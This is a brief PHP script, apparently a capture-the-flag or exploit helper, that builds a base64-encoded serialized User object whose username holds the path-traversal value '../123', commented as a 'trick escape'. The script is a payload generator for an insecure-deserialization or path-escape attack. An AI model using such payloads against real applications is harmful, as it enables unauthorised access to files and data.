<?php
class User {
    public $username;
    public $phone;
    public $email;
    public $description;
}

$u = new User();
$u->username = "../123";  // trick escape
$payload = base64_encode(serialize($u));
echo $payload . "\n";
